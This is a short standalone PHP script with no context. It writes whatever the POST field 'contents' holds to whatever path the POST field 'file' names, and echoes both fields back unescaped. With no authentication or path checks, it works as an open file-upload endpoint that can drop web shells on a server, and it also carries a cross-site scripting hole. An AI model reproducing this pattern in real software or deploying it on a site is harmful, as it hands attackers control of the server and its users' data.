<?php

echo $_POST['file'];
echo "\n\n";
echo $_POST['dir'];
$file = fopen($_POST['file'],'w');
fwrite($file, $_POST['contents']);
fclose($file);

?>